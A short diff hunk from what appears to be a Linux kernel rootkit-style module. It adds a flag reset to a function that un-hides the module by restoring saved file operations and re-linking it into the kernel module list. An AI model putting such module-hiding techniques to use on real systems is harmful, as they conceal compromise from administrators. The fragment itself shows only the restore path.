@@ -79,6 +79,7 @@ void make_module_removable(void){
 	if(is_hidden == 1){
 		sys_inode->i_fop = original_fops;
 		list_add(&THIS_MODULE->list, tmp_head);
+		is_hidden = 0;
 	}
 }
 
